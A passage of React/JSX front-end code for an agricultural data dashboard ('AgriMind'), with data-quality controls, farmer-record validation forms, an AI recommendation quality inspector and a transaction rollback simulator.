                    </div>
                    {dqSyncErrors > 0 && (
                      <button 
                        onClick={() => {
                          setDqSyncErrors(0);
                          addLog("Sync Errors Resolved", "info", "ProvenanceEngine", "Merged conflict entries using client-wins consensus strategy.");
                        }}
                        className="px-2 py-0.5 bg-cyan-600 hover:bg-cyan-700 text-white text-[7px] font-black uppercase rounded cursor-pointer transition-colors"
                      >
                        Re-sync
                      </button>
                    )}
                  </div>
                </div>

                {/* BENTO GRID: Data Quality Monitoring Console & AI Recommendation Quality Inspector */}
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                  
                  {/* Column 1: DQ Monitoring Console (Interactive switches to test) */}
                  <div className="p-5 bg-slate-50 dark:bg-slate-950/40 rounded-2xl border border-slate-100 dark:border-white/5 space-y-4">
                    <div className="space-y-1">
                      <span className="text-[9px] font-black uppercase text-slate-400 tracking-wider flex items-center gap-1">
                        <Activity className="w-3.5 h-3.5 text-cyan-500" />
                        Interactive DQ Monitoring Console
                      </span>
                      <p className="text-[10px] text-slate-500 font-semibold leading-relaxed">
                        Induce poor-quality data inputs. Watch how accuracy, completeness, consistency, and timeliness scores react immediately.
                      </p>
                    </div>

                    <div className="space-y-2 pt-1 font-mono text-[9px] font-bold text-slate-700 dark:text-slate-300">
                      {/* Missing values controller */}
                      <div className="flex items-center justify-between p-2 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl">
                        <span>Missing Profile Fields</span>
                        <div className="flex items-center gap-2">
                          <button 
                            onClick={() => setDqMissingValues(prev => Math.max(0, prev - 1))}
                            className="w-5 h-5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 text-[10px] rounded cursor-pointer flex items-center justify-center"
                          >
                            -
                          </button>
                          <span className="w-4 text-center">{dqMissingValues}</span>
                          <button 
                            onClick={() => setDqMissingValues(prev => prev + 1)}
                            className="w-5 h-5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 text-[10px] rounded cursor-pointer flex items-center justify-center"
                          >
                            +
                          </button>
                        </div>
                      </div>

                      {/* Duplicate profile controller */}
                      <div className="flex items-center justify-between p-2 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl">
                        <span>Duplicate Records</span>
                        <div className="flex items-center gap-2">
                          <button 
                            onClick={() => setDqDuplicateRecords(prev => Math.max(0, prev - 1))}
                            className="w-5 h-5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 text-[10px] rounded cursor-pointer flex items-center justify-center"
                          >
                            -
                          </button>
                          <span className="w-4 text-center">{dqDuplicateRecords}</span>
                          <button 
                            onClick={() => setDqDuplicateRecords(prev => prev + 1)}
                            className="w-5 h-5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 text-[10px] rounded cursor-pointer flex items-center justify-center"
                          >
                            +
                          </button>
                        </div>
                      </div>

                      {/* Invalid Values controller */}
                      <div className="flex items-center justify-between p-2 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl">
                        <span>Invalid Value Violations</span>
                        <div className="flex items-center gap-2">
                          <button 
                            onClick={() => setDqInvalidValues(prev => Math.max(0, prev - 1))}
                            className="w-5 h-5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 text-[10px] rounded cursor-pointer flex items-center justify-center"
                          >
                            -
                          </button>
                          <span className="w-4 text-center">{dqInvalidValues}</span>
                          <button 
                            onClick={() => setDqInvalidValues(prev => prev + 1)}
                            className="w-5 h-5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 text-[10px] rounded cursor-pointer flex items-center justify-center"
                          >
                            +
                          </button>
                        </div>
                      </div>

                      {/* Expired data controller */}
                      <div className="flex items-center justify-between p-2 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl">
                        <span>Expired Sensor Entries</span>
                        <div className="flex items-center gap-2">
                          <button 
                            onClick={() => setDqExpiredData(prev => Math.max(0, prev - 1))}
                            className="w-5 h-5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 text-[10px] rounded cursor-pointer flex items-center justify-center"
                          >
                            -
                          </button>
                          <span className="w-4 text-center">{dqExpiredData}</span>
                          <button 
                            onClick={() => setDqExpiredData(prev => prev + 1)}
                            className="w-5 h-5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 text-[10px] rounded cursor-pointer flex items-center justify-center"
                          >
                            +
                          </button>
                        </div>
                      </div>

                      {/* Outdated Weather toggle */}
                      <div className="flex items-center justify-between p-2 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl">
                        <span>Outdated PAGASA Feed</span>
                        <label className="relative inline-flex items-center cursor-pointer">
                          <input 
                            type="checkbox" 
                            checked={dqOutdatedWeather}
                            onChange={(e) => setDqOutdatedWeather(e.target.checked)}
                            className="sr-only peer"
                          />
                          <div className="w-7 h-4 bg-slate-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-3 after:w-3 after:transition-all peer-checked:bg-cyan-500"></div>
                        </label>
                      </div>

                      {/* Broken References controller */}
                      <div className="flex items-center justify-between p-2 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl">
                        <span>Broken GIS References</span>
                        <div className="flex items-center gap-2">
                          <button 
                            onClick={() => setDqBrokenReferences(prev => Math.max(0, prev - 1))}
                            className="w-5 h-5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 text-[10px] rounded cursor-pointer flex items-center justify-center"
                          >
                            -
                          </button>
                          <span className="w-4 text-center">{dqBrokenReferences}</span>
                          <button 
                            onClick={() => setDqBrokenReferences(prev => prev + 1)}
                            className="w-5 h-5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 text-[10px] rounded cursor-pointer flex items-center justify-center"
                          >
                            +
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Column 2: Automated Validation Sandbox Form */}
                  <div className="p-5 bg-slate-50 dark:bg-slate-950/40 rounded-2xl border border-slate-100 dark:border-white/5 flex flex-col justify-between">
                    <div className="space-y-3">
                      <div className="space-y-1">
                        <span className="text-[9px] font-black uppercase text-slate-400 tracking-wider flex items-center gap-1">
                          <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
                          Business Rules Automated Validation
                        </span>
                        <p className="text-[10px] text-slate-500 font-semibold leading-relaxed">
                          Automated validation safeguards. Submit variables to verify that invalid inputs are rejected early before reaching databases.
                        </p>
                      </div>

                      <form onSubmit={handleRunSandboxValidation} className="space-y-2 pt-1 text-[10px]">
                        <div className="grid grid-cols-2 gap-2">
                          <div>
                            <label className="text-[8px] font-black uppercase text-slate-400 block mb-0.5">Farm Area (ha)</label>
                            <input 
                              type="text" 
                              value={sandboxFarmArea}
                              onChange={(e) => setSandboxFarmArea(e.target.value)}
                              className="w-full px-2 py-1 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-lg text-[9px] font-bold dark:text-white"
                            />
                          </div>
                          <div>
                            <label className="text-[8px] font-black uppercase text-slate-400 block mb-0.5">Phone Number</label>
                            <input 
                              type="text" 
                              value={sandboxPhone}
                              onChange={(e) => setSandboxPhone(e.target.value)}
                              className="w-full px-2 py-1 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-lg text-[9px] font-bold dark:text-white"
                            />
                          </div>
                        </div>

                        <div>
                          <label className="text-[8px] font-black uppercase text-slate-400 block mb-0.5">Email Address</label>
                          <input 
                            type="text" 
                            value={sandboxEmail}
                            onChange={(e) => setSandboxEmail(e.target.value)}
                            className="w-full px-2 py-1 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-lg text-[9px] font-bold dark:text-white"
                          />
                        </div>

                        <div className="grid grid-cols-2 gap-2">
                          <div>
                            <label className="text-[8px] font-black uppercase text-slate-400 block mb-0.5">Planting Date</label>
                            <input 
                              type="date" 
                              value={sandboxPlantDate}
                              onChange={(e) => setSandboxPlantDate(e.target.value)}
                              className="w-full px-2 py-1 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-lg text-[8px] font-bold dark:text-white leading-none"
                            />
                          </div>
                          <div>
                            <label className="text-[8px] font-black uppercase text-slate-400 block mb-0.5">Harvest Date</label>
                            <input 
                              type="date" 
                              value={sandboxHarvestDate}
                              onChange={(e) => setSandboxHarvestDate(e.target.value)}
                              className="w-full px-2 py-1 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-lg text-[8px] font-bold dark:text-white leading-none"
                            />
                          </div>
                        </div>

                        {sandboxValErrors.length > 0 && (
                          <div className="p-2 bg-rose-50 border border-rose-100 text-rose-800 dark:bg-rose-950/20 dark:border-rose-900/40 dark:text-rose-400 rounded-lg space-y-0.5 leading-tight">
                            <span className="text-[8px] font-black block uppercase text-rose-600">REJECTED EARLY (ZOD FAIL):</span>
                            <ul className="list-disc pl-3 text-[7px] font-bold">
                              {sandboxValErrors.map((err, idx) => <li key={idx}>{err}</li>)}
                            </ul>
                          </div>
                        )}

                        {sandboxSuccess && (
                          <div className="p-2 bg-emerald-50 border border-emerald-100 text-emerald-800 dark:bg-emerald-950/20 dark:border-emerald-900/40 dark:text-emerald-300 rounded-lg text-[8px] font-black leading-tight flex items-center gap-1">
                            <Check className="w-3 h-3 text-emerald-500 shrink-0" />
                            <span>CLEARED: Business rules parsed. Written to ledger.</span>
                          </div>
                        )}

                        <button 
                          type="submit"
                          className="w-full py-1.5 bg-slate-900 hover:bg-slate-800 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-[9px] font-black uppercase rounded-lg transition-colors cursor-pointer mt-1"
                        >
                          Run pre-storage validation checks
                        </button>
                      </form>
                    </div>
                  </div>

                  {/* Column 3: AI Recommendation Quality Inspector Configuration */}
                  <div className="p-5 bg-slate-50 dark:bg-slate-950/40 rounded-2xl border border-slate-100 dark:border-white/5 flex flex-col justify-between">
                    <div className="space-y-3">
                      <div className="space-y-1">
                        <span className="text-[9px] font-black uppercase text-slate-400 tracking-wider flex items-center gap-1">
                          <Radio className="w-3.5 h-3.5 text-purple-500 animate-pulse" />
                          AI Recommendation Quality Inspector
                        </span>
                        <p className="text-[10px] text-slate-500 font-semibold leading-relaxed">
                          Gemini evaluates the quality of all incoming data points before synthesizing agricultural recommendation profiles.
                        </p>
                      </div>

                      {/* Selectors for data point quality */}
                      <div className="space-y-1.5 pt-1 text-[8px] font-bold text-slate-600 dark:text-slate-400">
                        <div>
                          <span className="block mb-0.5">⛅ WEATHER TELEMETRY QUALITY:</span>
                          <div className="grid grid-cols-3 gap-1">
                            <button 
                              onClick={() => setAiWeatherQuality("excellent")}
                              className={`py-1 rounded text-[8px] font-bold uppercase transition-all cursor-pointer ${
                                aiWeatherQuality === "excellent" ? "bg-emerald-600 text-white" : "bg-white dark:bg-slate-900 border border-slate-200"
                              }`}
                            >
                              Excellent
                            </button>
                            <button 
                              onClick={() => setAiWeatherQuality("stale")}
                              className={`py-1 rounded text-[8px] font-bold uppercase transition-all cursor-pointer ${
                                aiWeatherQuality === "stale" ? "bg-amber-500 text-white" : "bg-white dark:bg-slate-900 border border-slate-200"
                              }`}
                            >
                              Stale (40%)
                            </button>
                            <button 
                              onClick={() => setAiWeatherQuality("offline")}
                              className={`py-1 rounded text-[8px] font-bold uppercase transition-all cursor-pointer ${
                                aiWeatherQuality === "offline" ? "bg-rose-600 text-white" : "bg-white dark:bg-slate-900 border border-slate-200"
                              }`}
                            >
                              Missing (0%)
                            </button>
                          </div>
                        </div>

                        <div>
                          <span className="block mb-0.5">💧 SOIL MOISTURE TELEMETRY QUALITY:</span>
                          <div className="grid grid-cols-3 gap-1">
                            <button 
                              onClick={() => setAiSoilQuality("excellent")}
                              className={`py-1 rounded text-[8px] font-bold uppercase transition-all cursor-pointer ${
                                aiSoilQuality === "excellent" ? "bg-emerald-600 text-white" : "bg-white dark:bg-slate-900 border border-slate-200"
                              }`}
                            >
                              Excellent
                            </button>
                            <button 
                              onClick={() => setAiSoilQuality("moderate")}
                              className={`py-1 rounded text-[8px] font-bold uppercase transition-all cursor-pointer ${
                                aiSoilQuality === "moderate" ? "bg-amber-500 text-white" : "bg-white dark:bg-slate-900 border border-slate-200"
                              }`}
                            >
                              Mod (76%)
                            </button>
                            <button 
                              onClick={() => setAiSoilQuality("missing")}
                              className={`py-1 rounded text-[8px] font-bold uppercase transition-all cursor-pointer ${
                                aiSoilQuality === "missing" ? "bg-rose-600 text-white" : "bg-white dark:bg-slate-900 border border-slate-200"
                              }`}
                            >
                              Missing (0%)
                            </button>
                          </div>
                        </div>

                        <div>
                          <span className="block mb-0.5">🌾 HISTORIC CROP RECORD QUALITY:</span>
                          <div className="grid grid-cols-2 gap-1">
                            <button 
                              onClick={() => setAiCropQuality("excellent")}
                              className={`py-1 rounded text-[8px] font-bold uppercase transition-all cursor-pointer ${
                                aiCropQuality === "excellent" ? "bg-emerald-600 text-white" : "bg-white dark:bg-slate-900 border border-slate-200"
                              }`}
                            >
                              Excellent (95%)
                            </button>
                            <button 
                              onClick={() => setAiCropQuality("incomplete")}
                              className={`py-1 rounded text-[8px] font-bold uppercase transition-all cursor-pointer ${
                                aiCropQuality === "incomplete" ? "bg-amber-500 text-white" : "bg-white dark:bg-slate-900 border border-slate-200"
                              }`}
                            >
                              Incomplete (30%)
                            </button>
                          </div>
                        </div>

                        <div>
                          <span className="block mb-0.5">💰 COOP MARKET PRICES FRESHNESS:</span>
                          <div className="grid grid-cols-2 gap-1">
                            <button 
                              onClick={() => setAiMarketQuality("excellent")}
                              className={`py-1 rounded text-[8px] font-bold uppercase transition-all cursor-pointer ${
                                aiMarketQuality === "excellent" ? "bg-emerald-600 text-white" : "bg-white dark:bg-slate-900 border border-slate-200"
                              }`}
                            >
                              Fresh (98%)
                            </button>
                            <button 
                              onClick={() => setAiMarketQuality("outdated")}
                              className={`py-1 rounded text-[8px] font-bold uppercase transition-all cursor-pointer ${
                                aiMarketQuality === "outdated" ? "bg-rose-600 text-white" : "bg-white dark:bg-slate-900 border border-slate-200"
                              }`}
                            >
                              Outdated 3 days
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>

                    <button 
                      onClick={handleRunAiInspection}
                      disabled={aiIsRunning}
                      className="w-full py-1.5 bg-purple-700 hover:bg-purple-800 text-white text-[9px] font-black uppercase rounded-lg transition-colors cursor-pointer mt-2 animate-pulse"
                    >
                      {aiIsRunning ? "Evaluating Data Quality & Querying Gemini..." : "Request AI Recommendation"}
                    </button>
                  </div>

                </div>

                {/* AI QUALITY INSPECTOR OUTPUT CARD */}
                {(aiInspectionReport || aiRecommendationText) && (
                  <div className="p-6 bg-slate-950 border border-slate-800 rounded-2xl text-white font-mono text-[10px] space-y-4 animate-fade-in">
                    <div className="flex items-center justify-between border-b border-slate-800 pb-2.5">
                      <h4 className="text-cyan-400 font-bold uppercase tracking-wider flex items-center gap-1.5">
                        <Radio className="w-4 h-4 text-cyan-400 animate-pulse" />
                        🌾 AI Recommendation Quality Report
                      </h4>
                      <span className="text-[8px] text-slate-500">SYSTEM CORRELATION CHECK</span>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                      {/* Left: Input parameters evaluation list */}
                      <div className="space-y-2 border-r border-slate-800 pr-4">
                        <span className="text-[8px] font-bold uppercase text-slate-500 block mb-1">Telemetry Input Quality Feed</span>
                        <div className="space-y-1.5 text-[9px]">
                          <div className="flex justify-between">
                            <span>Weather Data:</span>
                            <span className={aiWeatherQuality === "excellent" ? "text-emerald-400 font-bold" : aiWeatherQuality === "stale" ? "text-amber-400 font-bold" : "text-rose-500 font-bold"}>
                              {aiWeatherQuality === "excellent" ? "🟢 Excellent (99%)" : aiWeatherQuality === "stale" ? "🟡 Stale (40%)" : "🔴 Missing (0%)"}
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <span>Soil Data:</span>
                            <span className={aiSoilQuality === "excellent" ? "text-emerald-400 font-bold" : aiSoilQuality === "moderate" ? "text-amber-400 font-bold" : "text-rose-500 font-bold"}>
                              {aiSoilQuality === "excellent" ? "🟢 Excellent (98%)" : aiSoilQuality === "moderate" ? "🟡 Moderate (76%)" : "🔴 Missing (0%)"}
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <span>Crop Records:</span>
                            <span className={aiCropQuality === "excellent" ? "text-emerald-400 font-bold" : "text-amber-400 font-bold"}>
                              {aiCropQuality === "excellent" ? "🟢 Excellent (95%)" : "🟡 Incomplete (30%)"}
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <span>Market Prices:</span>
                            <span className={aiMarketQuality === "excellent" ? "text-emerald-400 font-bold" : "text-rose-400 font-bold"}>
                              {aiMarketQuality === "excellent" ? "🟢 Excellent (98%)" : "🔴 Outdated 3 days (50%)"}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Middle: Calculated summary metrics */}
                      <div className="space-y-2 md:border-r md:border-slate-800 md:px-4">
                        <span className="text-[8px] font-bold uppercase text-slate-500 block mb-1">Analytical Aggregation</span>
                        {aiInspectionReport && (
                          <div className="space-y-1 text-[9px]">
                            <div className="flex justify-between">
                              <span>Overall Data Quality:</span>
                              <span className="font-bold text-white">{aiInspectionReport.overallScore}%</span>
                            </div>
                            <div className="flex justify-between">
                              <span>Recommendation Confidence:</span>
                              <span className={aiInspectionReport.confidence >= 85 ? "text-emerald-400 font-bold" : aiInspectionReport.confidence >= 60 ? "text-amber-400 font-bold" : "text-rose-500 font-bold"}>
                                {aiInspectionReport.confidence}%
                              </span>
                            </div>
                          </div>
                        )}
                        {aiInspectionReport?.notice && (
                          <div className="p-1.5 bg-rose-500/10 border border-rose-900/30 text-[8px] text-rose-300 rounded uppercase font-bold mt-2">
                            ⚠️ NOTICE: {aiInspectionReport.notice}
                          </div>
                        )}
                      </div>

                      {/* Right: Actual AI output text */}
                      <div className="md:pl-4 space-y-1">
                        <span className="text-[8px] font-bold uppercase text-slate-500 block">AI Synthesis Response Output</span>
                        <div className={`p-2.5 rounded-lg border text-[9.5px] leading-relaxed font-sans ${
                          aiSoilQuality === "missing" 
                            ? "bg-rose-950/20 border-rose-800 text-rose-200" 
                            : "bg-white/[0.02] border-slate-800 text-slate-100 font-semibold"
                        }`}>
                          {aiRecommendationText}
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>

              {/* Grid: Schema Validator and Transaction Simulator */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                
                {/* 2. Philippine RSBSA Schema Validator Form */}
                <div className="space-y-4 bg-slate-50 dark:bg-slate-950/40 p-5 rounded-2xl border border-slate-100 dark:border-white/5 flex flex-col justify-between">
                  <div className="space-y-3">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">2. RSBSA Schema Validator (Zod Engine simulation)</span>
                    <p className="text-[10px] text-slate-500 font-semibold leading-relaxed">
                      Every row written to AgriMind databases undergoes validation checks server-side. Submit custom parameters below to test schema assertions.
                    </p>

                    <form onSubmit={handleValidateSchema} className="space-y-3 pt-1">
                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Farmer Name</label>
                          <input 
                            type="text" 
                            value={farmerNameVal} 
                            onChange={(e) => setFarmerNameVal(e.target.value)}
                            className="w-full px-2.5 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                          />
                        </div>
                        <div>
                          <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Phone Number</label>
                          <input 
                            type="text" 
                            value={farmerPhoneVal} 
                            onChange={(e) => setFarmerPhoneVal(e.target.value)}
                            className="w-full px-2.5 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Email (Optional)</label>
                          <input 
                            type="text" 
                            value={farmerEmailVal} 
                            onChange={(e) => setFarmerEmailVal(e.target.value)}
                            className="w-full px-2.5 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                          />
                        </div>
                        <div>
                          <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">RSBSA Code</label>
                          <input 
                            type="text" 
                            value={farmerRsbsaVal} 
                            onChange={(e) => setFarmerRsbsaVal(e.target.value)}
                            className="w-full px-2.5 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-3 gap-2">
                        <div>
                          <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Latitude bounds</label>
                          <input 
                            type="text" 
                            value={farmerLatVal} 
                            onChange={(e) => setFarmerLatVal(e.target.value)}
                            className="w-full px-2.5 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                          />
                        </div>
                        <div>
                          <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Longitude bounds</label>
                          <input 
                            type="text" 
                            value={farmerLngVal} 
                            onChange={(e) => setFarmerLngVal(e.target.value)}
                            className="w-full px-2.5 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                          />
                        </div>
                        <div>
                          <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Area (ha)</label>
                          <input 
                            type="text" 
                            value={farmerAreaVal} 
                            onChange={(e) => setFarmerAreaVal(e.target.value)}
                            className="w-full px-2.5 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Crop Type</label>
                          <select 
                            value={farmerCropVal} 
                            onChange={(e) => setFarmerCropVal(e.target.value)}
                            className="w-full px-2.5 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                          >
                            <option value="Palay Rice">Palay Rice</option>
                            <option value="Saba Banana">Saba Banana</option>
                            <option value="Sweet Corn">Sweet Corn</option>
                            <option value="Zambales Mango">Zambales Mango</option>
                          </select>
                        </div>
                        <div>
                          <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Official Barangay</label>
                          <select 
                            value={farmerBarangayVal} 
                            onChange={(e) => setFarmerBarangayVal(e.target.value)}
                            className="w-full px-2.5 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                          >
                            <option value="Poblacion">Poblacion</option>
                            <option value="Batonlapoc">Batonlapoc</option>
                            <option value="Carael">Carael</option>
                            <option value="Loob Bunga">Loob Bunga</option>
                          </select>
                        </div>
                      </div>

                      {schemaErrors.length > 0 && (
                        <div className="p-3 bg-rose-50 border border-rose-100 text-rose-800 dark:bg-rose-950/20 dark:border-rose-900/40 dark:text-rose-400 rounded-xl space-y-1">
                          <span className="text-[9px] font-black block">SCHEMA MISMATCH (REJECTED):</span>
                          <ul className="list-disc pl-4 text-[8px] font-bold space-y-0.5">
                            {schemaErrors.map((err, idx) => <li key={idx}>{err}</li>)}
                          </ul>
                        </div>
                      )}

                      {schemaSuccessMsg && (
                        <div className="p-3 bg-emerald-50 border border-emerald-100 text-emerald-800 dark:bg-emerald-950/20 dark:border-emerald-900/40 dark:text-emerald-300 rounded-xl space-y-0.5 text-[9px] font-bold">
                          <div className="flex items-center gap-1"><Check className="w-3.5 h-3.5 text-emerald-500" /><span>Success!</span></div>
                          <p className="text-[8px] font-mono leading-normal text-slate-500 dark:text-slate-400">{schemaSuccessMsg}</p>
                        </div>
                      )}

                      <button 
                        type="submit"
                        className="w-full py-2 bg-slate-900 hover:bg-slate-800 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-xs font-black uppercase rounded-xl transition-colors cursor-pointer"
                      >
                        Submit & Parse Schema
                      </button>
                    </form>
                  </div>
                </div>

                {/* 3. Transaction Integrity & Rollback Simulator */}
                <div className="space-y-4 bg-slate-50 dark:bg-slate-950/40 p-5 rounded-2xl border border-slate-100 dark:border-white/5 flex flex-col justify-between">
                  <div className="space-y-3">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">3. Transaction Integrity (ACID Rollback Simulator)</span>
                    <p className="text-[10px] text-slate-500 font-semibold leading-relaxed">
                      Registering a farmer requires writing to multiple tables. If one step fails, the entire transaction is rolled back to prevent incomplete profiles.
                    </p>

                    {/* Step visualization bars */}
                    <div className="space-y-2 bg-white dark:bg-slate-900 p-4 rounded-xl border border-slate-150 dark:border-white/5">
                      <div className="flex items-center justify-between text-[8px] font-black uppercase tracking-wider mb-2">
                        <span className="text-slate-400">Step Progression</span>
                        <span className={`px-2 py-0.5 rounded text-[8px] font-black uppercase ${
                          txStatus === "success" 
                            ? "bg-emerald-100 text-emerald-800" 
                            : txStatus === "rolledback" 
                            ? "bg-rose-100 text-rose-800" 
                            : txStatus === "running" 
                            ? "bg-cyan-100 text-cyan-800 animate-pulse" 
                            : "bg-slate-100 text-slate-600"
                        }`}>
                          {txStatus === "idle" ? "Pending" : txStatus}
                        </span>
                      </div>

                      {/* Step 1 */}
                      <div className="flex items-center justify-between text-[9px] font-bold">
                        <span className={txStep >= 1 ? "text-slate-800 dark:text-white" : "text-slate-400"}>1. Begin Transaction & Create User identity (UUID)</span>
                        <span className="font-mono text-[8px]">
                          {txStep > 1 ? "🟢 Passed" : txStep === 1 ? "🟡 Running" : "⚪ Pending"}
                        </span>
                      </div>
                      {/* Step 2 */}
                      <div className="flex items-center justify-between text-[9px] font-bold">
                        <span className={txStep >= 2 ? "text-slate-800 dark:text-white" : "text-slate-400"}>2. Create Farm Profile (Spatial polygon links)</span>
                        <span className="font-mono text-[8px]">
                          {txStep > 2 ? "🟢 Passed" : txStep === 2 ? "🟡 Running" : "⚪ Pending"}
                        </span>
                      </div>
                      {/* Step 3 */}
                      <div className="flex items-center justify-between text-[9px] font-bold">
                        <span className={txStep >= 3 ? "text-slate-800 dark:text-white" : "text-slate-400"}>3. Create Cryptographic Audit Log entry</span>
                        <span className="font-mono text-[8px]">
                          {txStep > 3 && txStatus !== "rolledback" ? "🟢 Passed" : txStep === 3 ? "🟡 Running" : txStep > 3 && txStatus === "rolledback" ? "🔴 FAILED" : "⚪ Pending"}
                        </span>
                      </div>
                      {/* Step 4 */}
                      <div className="flex items-center justify-between text-[9px] font-bold">
                        <span className={txStep >= 4 ? "text-slate-800 dark:text-white" : "text-slate-400"}>4. Commit persistence state persistently</span>
                        <span className="font-mono text-[8px]">
                          {txStep > 4 ? "🟢 Passed" : txStep === 4 && txStatus !== "rolledback" ? "🟡 Running" : txStep === 4 && txStatus === "rolledback" ? "🔴 ROLLED BACK" : "⚪ Pending"}
                        </span>
                      </div>
                    </div>

                    <div className="space-y-2 pt-1">
                      <span className="text-[8px] font-black uppercase text-slate-400 block">Induce Network/Storage Failures:</span>
                      <div className="flex items-center gap-4">
                        <label className="flex items-center gap-1.5 text-[10px] font-bold text-slate-700 dark:text-slate-300 cursor-pointer">
                          <input 
                            type="radio" 
                            name="txFailOption" 
                            checked={txFailAtStep === "none"}
                            onChange={() => setTxFailAtStep("none")}
                            className="cursor-pointer"
                          />
                          <span>Normal (Success COMMIT)</span>
                        </label>
                        <label className="flex items-center gap-1.5 text-[10px] font-bold text-slate-700 dark:text-slate-300 cursor-pointer">
                          <input 
                            type="radio" 
                            name="txFailOption" 
                            checked={txFailAtStep === "step3"}
                            onChange={() => setTxFailAtStep("step3")}
                            className="cursor-pointer"
                          />
                          <span className="text-rose-500">Fail Audit step (ROLLBACK)</span>
                        </label>
                      </div>
                    </div>
                  </div>

                  <button
                    onClick={handleRunTransaction}
                    disabled={txStatus === "running"}
                    className="w-full py-3 bg-slate-900 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-xs font-black uppercase rounded-xl transition-all disabled:opacity-50 cursor-pointer mt-4"
                  >
                    {txStatus === "running" ? "Running ACID Steps..." : "Run Transaction Cascade"}
                  </button>
                </div>

              </div>

              {/* SECTION 4: Version History & Soft-Delete Restore Center */}
              <div className="space-y-4 pt-4 border-t border-slate-100 dark:border-white/5">
                <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">4. Soft-Delete & Version History Audit Center</span>
                
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  {/* Left: Active Records (Soft-Deleteable) */}
                  <div className="md:col-span-2 space-y-3">
                    <span className="text-[9px] font-black uppercase text-slate-400 block">Active Farm Records (Mutable but tracked)</span>
                    
                    <div className="space-y-3 bg-slate-50 dark:bg-slate-950/20 p-4 rounded-2xl border border-slate-100 dark:border-white/5">
                      {farmProfiles.map(p => (
                        <div key={p.id} className="p-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-150 dark:border-white/5 space-y-2">
                          <div className="flex items-center justify-between">
                            <div>
                              <h5 className="font-extrabold text-[11px] text-slate-800 dark:text-white">{p.farmerName}</h5>
                              <span className="text-[8px] font-mono text-slate-400 block truncate max-w-xs">ID: {p.id}</span>
                            </div>
                            <div className="flex gap-2">
                              <button 
                                onClick={() => handleStartEdit(p.id)}
                                className="px-2 py-0.5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 text-[8px] font-black uppercase rounded cursor-pointer"
                              >
                                Edit
                              </button>
                              <button 
                                onClick={() => handleSoftDelete(p.id)}
